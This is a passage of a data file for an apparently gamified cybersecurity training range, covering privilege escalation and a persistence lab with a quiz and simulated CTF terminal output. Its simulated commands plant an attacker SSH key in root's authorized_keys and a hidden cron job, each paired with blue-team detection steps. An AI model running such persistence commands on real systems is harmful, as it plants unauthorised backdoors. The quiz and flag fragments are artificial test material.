            "[+] Impersonating SYSTEM token ...",
            "C:\\Windows\\System32> whoami",
            "nt authority\\system           <-- SYSTEM!",
            "C:\\> type C:\\Users\\Administrator\\Desktop\\flag.txt   ->  (flag retrieved)",
            "",
            ">> LEARN: SeImpersonate + a Potato exploit = near-universal service-acct → SYSTEM",
            ">> BLUE TEAM: remove SeImpersonate where unneeded; quote/lock services; patch.",
            "   Run 'assemble' to view the flag and the submit command.",
          ],
        }),
      },
    },
  },

  // ─── Lab 4: persistence + cleanup ───────────────────────────────────────────
  {
    epochId: "range-privesc",
    wonder: { name: "The Foothold That Stays", location: "Offensive Security Lab", era: "Present Day", emoji: "📌" },
    id: "pe-04",
    order: 4,
    title: "Persistence & the Defender's View",
    subtitle: "Keep access — and how the blue team finds it",
    category: "cybersecurity",
    xp: 200,
    badge: { id: "badge-pe-persist", name: "Persistence", emoji: "📌" },
    challengeType: "ctf",
    info: {
      tagline: "Root once is luck; root after every reboot is an operation — and persistence is the loudest thing a defender can hunt.",
      year: 2013,
      overview: [
        "After escalation, an operator wants durable access that survives reboots, password changes, and patching — persistence. The mechanisms are well-catalogued (MITRE ATT&CK's Persistence tactic): on Linux, cron jobs, systemd services, modified startup scripts, added SSH authorized_keys, and new privileged accounts; on Windows, registry Run keys, scheduled tasks, new services, WMI event subscriptions, and startup-folder entries. Each plants a hook that re-establishes the attacker's foothold automatically. In a real engagement persistence is what separates a momentary win from sustained control, and in ransomware it's how crews retain access while they stage.",
        "Persistence is also the attacker's riskiest move, because it's the most detectable — every persistence mechanism is a change to a watched location, and that's the defender's advantage. The blue team hunts exactly these artifacts: new or modified cron/systemd units, unexpected authorized_keys, new accounts and group memberships, new Run keys and scheduled tasks, and the EDR telemetry around them. This lab closes the offensive arc by showing persistence and then flipping to the defender's view — file integrity monitoring, EDR, account and scheduled-task auditing, and the MITRE ATT&CK detections that catch each technique. Understanding how access is kept is how you take it away; the attacker's persistence checklist is the hunter's detection checklist.",
      ],
      technical: {
        title: "Persistence Techniques & Detection",
        body: [
          "Linux persistence (ATT&CK):\n- Cron job or systemd service running a callback.\n- ~/.ssh/authorized_keys — add the attacker's public key (survives password change).\n- A new UID-0 account or sudoers entry; modified shell rc / startup scripts.",
          "Windows persistence (ATT&CK):\n- Registry Run/RunOnce keys; Startup folder shortcuts.\n- Scheduled tasks; new services; WMI event subscriptions.\n- New local/domain accounts; AdminSDHolder / DCSync-grade footholds.",
          "The defender's view (persistence is the loudest move):\n- File Integrity Monitoring on cron/systemd/authorized_keys/Run keys/scheduled tasks.\n- EDR detections mapped to MITRE ATT&CK Persistence (T1053 scheduled task, T1098 account manipulation, T1547 boot/logon autostart).\n- Audit new accounts, group changes, and service/task creation.\n- Baseline + alert on change: every persistence hook is a modification to a watched location.",
        ],
        codeExample: {
          label: "SSH key persistence — and how it's caught",
          code: `# Attacker: durable Linux access (survives password change)
root# echo "ssh-ed25519 AAAA...attacker" >> /root/.ssh/authorized_keys
root# (also: a systemd service or cron callback for redundancy)

# Defender: file integrity + audit catch it
$ auditctl -w /root/.ssh/authorized_keys -p wa   # alert on write
$ ls -la /etc/cron.d /etc/systemd/system          # review for new units
# EDR -> MITRE ATT&CK T1098.004 (SSH authorized_keys), T1053 (cron/task)

# THE FIX/DETECT: FIM on autostart locations; audit accounts/tasks; baseline+alert`,
        },
      },
      incident: {
        title: "Persistence — Where Hunters Win",
        when: "Every post-compromise operation; the core of threat hunting",
        where: "Endpoints and servers across enterprise environments",
        impact: "Persistence sustains intrusions — and, because it's detectable, is the defender's best catch point",
        body: [
          "In real intrusions, persistence is both the attacker's goal and the defender's opportunity: dwell time is sustained by persistence hooks, but every hook is a change to a monitored location. Threat hunting and EDR are built around the MITRE ATT&CK Persistence tactic precisely because these techniques are finite, catalogued, and observable — a new scheduled task, an unexpected authorized_keys entry, a fresh Run key.",
          "That is the note this Range ends on: the entire offensive chain you've practiced — recon, exploitation, credentials, escalation, persistence — is, read in reverse, the defender's detection and hardening program. You learn the attack to build the defense. Baseline the autostart locations, monitor for change, map your detections to ATT&CK, and the operator's persistence becomes the hunter's alert.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Operator (root/SYSTEM)", sub: "plant persistence", type: "attacker" },
          { label: "Autostart hooks", sub: "cron/key/task/Run key", type: "system" },
          { label: "Survives reboot", sub: "durable access", type: "victim" },
          { label: "Hunter catches it", sub: "→ FIM + EDR + ATT&CK", type: "result" },
        ],
      },
      timeline: [
        { year: 2013, event: "MITRE ATT&CK formalizes the Persistence tactic", highlight: true },
        { year: 2018, event: "EDR detections standardize on ATT&CK technique mapping" },
        { year: 2021, event: "Human-operated ransomware makes persistence a hunting priority" },
      ],
      keyTakeaways: [
        "Persistence keeps access across reboots/password changes (MITRE ATT&CK Persistence tactic)",
        "Linux: cron/systemd, authorized_keys, new accounts; Windows: Run keys, scheduled tasks, services, WMI",
        "Persistence is the attacker's riskiest, most detectable move — every hook is a change to a watched location",
        "Defenders hunt the same artifacts: FIM, account/task auditing, EDR mapped to ATT&CK",
        "The whole offensive chain, read backwards, is the defender's detection + hardening program",
      ],
      references: [
        { title: "MITRE ATT&CK — Persistence (TA0003)", url: "https://attack.mitre.org/tactics/TA0003/" },
        { title: "ATT&CK — Account Manipulation (T1098)", url: "https://attack.mitre.org/techniques/T1098/" },
      ],
    },
    quiz: {
      questions: [
        { id: "pe-04-q1", type: "Goal", challenge: "Why persist.", text: "Why does an attacker establish persistence?", options: ["To keep access across reboots, password changes, and patching", "To scan ports", "To encrypt the disk", "To crack hashes"], correctIndex: 0, explanation: "Persistence sustains the foothold over time." },
        { id: "pe-04-q2", type: "Linux", challenge: "SSH key.", text: "Why is adding an SSH authorized_keys entry effective persistence?", options: ["It survives a password change and re-grants access", "It encrypts the host", "It removes logs", "It needs the password"], correctIndex: 0, explanation: "Key-based access doesn't depend on the (changeable) password." },
        { id: "pe-04-q3", type: "Windows", challenge: "Autostart.", text: "Which is a common Windows persistence mechanism?", options: ["Registry Run keys / scheduled tasks / new services", "Closing ports", "Reinstalling Windows", "Disabling SMB"], correctIndex: 0, explanation: "Run keys and scheduled tasks re-launch the implant at boot/logon." },
        { id: "pe-04-q4", type: "Framework", challenge: "Catalog.", text: "Which framework catalogs persistence techniques?", options: ["MITRE ATT&CK (Persistence tactic)", "OWASP Top 10", "PCI DSS", "NIST 800-53 only"], correctIndex: 0, explanation: "ATT&CK's Persistence tactic enumerates these techniques." },
        { id: "pe-04-q5", type: "Detection", challenge: "Why catchable.", text: "Why is persistence the defender's best catch point?", options: ["Every persistence hook is a change to a monitored/autostart location", "It's invisible", "It uses no files", "It requires no privileges"], correctIndex: 0, explanation: "Persistence modifies watched locations, generating detectable artifacts." },
        { id: "pe-04-q6", type: "Detection", challenge: "Tooling.", text: "What detects persistence artifacts?", options: ["File Integrity Monitoring + account/task auditing + EDR mapped to ATT&CK", "A spam filter", "A CAPTCHA", "A faster CPU"], correctIndex: 0, explanation: "FIM, auditing, and ATT&CK-mapped EDR catch the changes." },
        { id: "pe-04-q7", type: "Concept", challenge: "Reverse reading.", text: "What does the offensive chain become when read backwards?", options: ["The defender's detection and hardening program", "A marketing plan", "A new exploit", "Nothing"], correctIndex: 0, explanation: "Each attack step maps to a defensive control/detection." },
        { id: "pe-04-q8", type: "Defense", challenge: "Baseline.", text: "What's the core defensive practice for persistence?", options: ["Baseline autostart locations and alert on any change", "Open all ports", "Disable auditing", "Share admin creds"], correctIndex: 0, explanation: "Baseline + alert-on-change surfaces persistence reliably." },
      ],
    },
    ctf: {
      attackerMachine: { ip: "10.10.10.40", hostname: "lab-target", os: "Linux (root shell)" },
      targetMachine: { ip: "10.10.10.40", hostname: "lab-target", os: "Linux", openPorts: "(root shell)", vulnerability: "n/a — you are root; establish + detect persistence" },
      scenario: "You've escalated to root on 10.10.10.40. Establish durable persistence, then flip to the defender's seat and see exactly how a hunter detects what you just planted.",
      hint: "Plant an SSH-key (and cron) persistence hook, then run the defender's detection to see it caught.",
      hints: [
        "Read the briefing. Run: cat briefing.txt",
        "Establish persistence (SSH key + cron). Run: plant-persist",
        "Switch to the blue team and detect it. Run: hunt-persist",
        "Run 'assemble' to view the assembled flag and the submit command",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{P3RS1ST_", label: "Persistence Briefing" },
        { trigger: "plant-persist", value: "CR0N_", label: "Persistence Established" },
        { trigger: "hunt-persist", value: "K3Y_PL4NT3D}", label: "Defender Detects It" },
      ],
      files: {
        "/briefing.txt": [
          "RANGE — PRIVESC LAB 4: PERSISTENCE & THE BLUE TEAM (you are root)",
          "Goal: plant durable persistence, then detect it as a hunter.",
          "Sequence: plant-persist -> hunt-persist -> assemble",
        ].join("\n"),
      },
      dirs: { "/": [{ name: "briefing.txt", isDir: false }] },
      extraCommands: {
        "plant-persist": (_args: string[]) => ({
          lines: [
            "root# echo 'ssh-ed25519 AAAA...attacker' >> /root/.ssh/authorized_keys",
            "root# echo '* * * * * root /tmp/.r >/dev/null 2>&1' > /etc/cron.d/.update",
            "  [+] SSH key persistence (survives password change)",
            "  [+] cron callback (redundant foothold)",
            "",
            ">> LEARN: durable access = survives reboots + password changes",
            "   But every hook is a change to a watched location... Fragment collected.",
          ],
        }),
        "hunt-persist": (_args: string[]) => ({
          lines: [
            "[BLUE TEAM] file integrity + audit sweep:",
            "  ! /root/.ssh/authorized_keys  MODIFIED  (new key — T1098.004)",
            "  ! /etc/cron.d/.update         NEW FILE  (hidden cron — T1053.003)",
            "  EDR: anomalous root cron child process flagged",
            "",
            ">> LEARN: persistence is the LOUDEST move — the hunter catches every hook",
            ">> BLUE TEAM: FIM on autostart locations + audit accounts/tasks, mapped to ATT&CK.",
            "   The whole attack chain, reversed, IS the defense. Run 'assemble'.",
          ],
        }),
      },
    },
  },
];
